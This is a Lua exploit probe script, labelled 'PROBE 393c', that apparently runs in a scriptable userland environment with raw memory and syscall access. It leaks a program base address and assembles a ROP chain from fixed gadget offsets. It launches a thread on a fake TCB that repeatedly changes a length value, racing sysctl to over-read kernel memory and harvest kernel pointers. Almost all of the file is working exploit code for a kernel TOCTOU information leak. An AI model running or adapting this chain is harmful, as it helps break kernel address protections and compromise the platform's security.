-- CRASH_CLASS: MODERATE
-- PROBE 393c: sysctl TOCTOU race v2 — dword-only writes (no wq corruption)
--
-- 393b crashed from stdout corruption during wq chain building.
-- This version uses ONLY memory.write_dword for all chain construction.

print("=== PROBE 393c: sysctl TOCTOU race v2 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

-- Write a 64-bit value as two dwords (avoids wq/uint64 corruption)
local function write64(addr, lo, hi)
    wd(addr, lo)
    wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end
local function fill_sent(buf, len)
    for i = 0, len - 4, 4 do wd(N(buf) + i, 0xDEADDEAD) end
end

-- Ignore SIGSYS
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
wq(N(act), uint64(1))
pcall(function() mk(416)(uint64(12), act, uint64(0)) end)

-- Get eboot base
local info_buf = memory.alloc(0x200)
zero_buf(info_buf, 0x200)
wd(N(info_buf), 0x160)
pcall(function() mk(593)(uint64(0), info_buf) end)
local eb_lo = rd(N(info_buf) + 0x108) or 0
local eb_hi = rd(N(info_buf) + 0x10C) or 0
print(string.format("eboot=%X_%08X", eb_hi, eb_lo))

-- fn_addr for syscall stub
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_val = tonumber(fn_str)
local fn_lo = fn_val % 0x100000000
local fn_hi = math.floor(fn_val / 0x100000000)

-- Gadget offsets (all relative to eboot)
local G = {
    pop_rax_ret = 0x992,
    pop_rdi_ret = 0xC9DFE,
    pop_rsi_ret = 0xD77D,
    pop_rdx_ret = 0x3B02D7,
    pop_rcx_ret = 0xE64,
    bare_ret = 0x42,
    mov_rdi_rax_ret = 0x92C67,
}

-- Helper: write gadget address (eboot + offset) as qword at stack position
local function write_gadget(addr, offset)
    local g_lo = eb_lo + offset
    local g_hi = eb_hi
    if g_lo >= 0x100000000 then
        g_hi = g_hi + math.floor(g_lo / 0x100000000)
        g_lo = g_lo % 0x100000000
    end
    write64(addr, g_lo, g_hi)
end

-- Helper: write fn_addr at stack position
local function write_fn(addr)
    write64(addr, fn_lo, fn_hi)
end

-- Shared race memory
local shared = memory.alloc(0x100)
zero_buf(shared, 0x100)
local oldlenp_addr = N(shared)
local flag_addr = N(shared) + 0x10

local small_len = 0x448  -- kinfo_proc size
local large_len = 0x2000 -- 8KB over-read target

wd(flag_addr, 1)
wd(oldlenp_addr, small_len)

-- Stack for child thread
local STACK_SIZE = 0x10000
local stack = memory.alloc(STACK_SIZE)
zero_buf(stack, STACK_SIZE)
local stack_base = N(stack)
local entry_rsp = ((stack_base + STACK_SIZE) - ((stack_base + STACK_SIZE) % 16)) - 8

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
zero_buf(fake_tcb, 0x1000)
wq(N(fake_tcb), fake_tcb)  -- self-ref at +0

local tcb_ptr_buf = memory.alloc(8)
wq(N(tcb_ptr_buf), fake_tcb)

-- Build ROP chain using write_dword only
-- start_func = pop_rax_ret, first thing on stack = value for RAX
local sp = entry_rsp
local function push_gadget(offset)
    write_gadget(sp, offset)
    sp = sp + 8
end
local function push_val(lo, hi)
    write64(sp, lo, hi or 0)
    sp = sp + 8
end
local function push_fn()
    write_fn(sp)
    sp = sp + 8
end

-- sysarch(165, SET_FSBASE=129, &tcb_ptr_buf)
push_val(165, 0)                    -- RAX = 165 (sysarch)
push_gadget(G.pop_rdi_ret)
push_val(129, 0)                    -- RDI = 129 (SET_FSBASE)
push_gadget(G.pop_rsi_ret)
push_val(N(tcb_ptr_buf), 0)        -- RSI = &tcb_ptr_buf
push_gadget(G.pop_rdx_ret)
push_val(0, 0)
push_gadget(G.pop_rcx_ret)
push_val(0, 0)
push_fn()                           -- call sysarch

-- Flip loop: 200 iterations of write large then small to oldlenp
local FLIP_COUNT = 200
for i = 1, FLIP_COUNT do
    -- Write large_len
    push_gadget(G.pop_rdi_ret)
    push_val(oldlenp_addr, 0)
    push_gadget(G.pop_rax_ret)
    push_val(large_len, 0)
    push_gadget(G.mov_rdi_rax_ret)

    -- Write small_len
    push_gadget(G.pop_rdi_ret)
    push_val(oldlenp_addr, 0)
    push_gadget(G.pop_rax_ret)
    push_val(small_len, 0)
    push_gadget(G.mov_rdi_rax_ret)
end

-- Signal done: flag = 0
push_gadget(G.pop_rdi_ret)
push_val(flag_addr, 0)
push_gadget(G.pop_rax_ret)
push_val(0, 0)
push_gadget(G.mov_rdi_rax_ret)

-- thr_exit(431)
push_gadget(G.pop_rax_ret)
push_val(431, 0)
push_gadget(G.pop_rdi_ret)
push_val(0, 0)
push_fn()

local chain_bytes = sp - entry_rsp
print(string.format("chain: %d bytes at rsp", chain_bytes))

-- thr_param
local param = memory.alloc(0x38)
zero_buf(param, 0x38)
-- start_func = pop_rax_ret
write_gadget(N(param), G.pop_rax_ret)
-- arg = 0 (unused)
write64(N(param) + 8, 0, 0)
-- stack_base
write64(N(param) + 0x10, stack_base, 0)
-- stack_size
write64(N(param) + 0x18, STACK_SIZE, 0)
-- child_tid
local child_tid = memory.alloc(8)
zero_buf(child_tid, 8)
write64(N(param) + 0x30, N(child_tid), 0)

if not alive() then print("DEAD [setup]"); return end

-- ===================================================================
-- [A] Launch child flipper
-- ===================================================================
print("[A] launching child")

local ok_thr, rv_thr = pcall(function()
    return mk(455)(uint64(N(param)), uint64(0x38))
end)
print(string.format("thr_new: ret=%d", ok_thr and N(rv_thr) or -999))

if (ok_thr and N(rv_thr) or -1) ~= 0 then
    print("thr_new failed, abort")
    print("=== 393c ABORTED ===")
    return
end

if not alive() then print("DEAD [thr_new]"); return end

-- ===================================================================
-- [B] Race sysctl vs child flipper
-- ===================================================================
print("[B] racing")

local mib = memory.alloc(16)
wd(N(mib), 1)
wd(N(mib) + 4, 14)
wd(N(mib) + 8, 1)
wd(N(mib) + 12, pid_val)

local outbuf = memory.alloc(0x2000)
local sc_sysctl = mk(202)

local RACE_ROUNDS = 300
local kptr_total = 0
local over_total = 0

for round = 1, RACE_ROUNDS do
    if not alive() then break end

    fill_sent(outbuf, 0x2000)
    wd(oldlenp_addr, small_len)
    wd(oldlenp_addr + 4, 0)

    local ok_sc, rv_sc = pcall(function()
        return sc_sysctl(uint64(N(mib)), uint64(4), outbuf,
            uint64(oldlenp_addr), uint64(0), uint64(0))
    end)
    local ret = ok_sc and N(rv_sc) or -999

    if ret == 0 then
        -- Check past kinfo_proc boundary
        local past = false
        for off = 0x448, 0x480, 4 do
            local d = rd(N(outbuf) + off)
            if d ~= nil and d ~= 0xDEADDEAD then
                past = true
                break
            end
        end

        if past then
            over_total = over_total + 1
            for off = 0x448, 0x1FF8, 8 do
                local lo = rd(N(outbuf) + off)
                local hi = rd(N(outbuf) + off + 4)
                if hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    kptr_total = kptr_total + 1
                    if kptr_total <= 10 then
                        print(string.format("  KPTR r=%d +%03X: %08X_%08X",
                            round, off, hi, lo or 0))
                    end
                end
            end
            if over_total <= 5 then
                print(string.format("  OVER-READ r=%d", round))
                for off = 0x448, 0x460, 4 do
                    local d = rd(N(outbuf) + off)
                    if d then print(string.format("    +%03X: %08X", off, d)) end
                end
            end
        end
    end
end

-- Check child status
local child_done = rd(flag_addr) == 0

print(string.format("rounds=%d overs=%d kptrs=%d child=%s",
    RACE_ROUNDS, over_total, kptr_total,
    child_done and "done" or "running"))

if not alive() then print("DEAD [race]"); return end
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 393c COMPLETE ===")
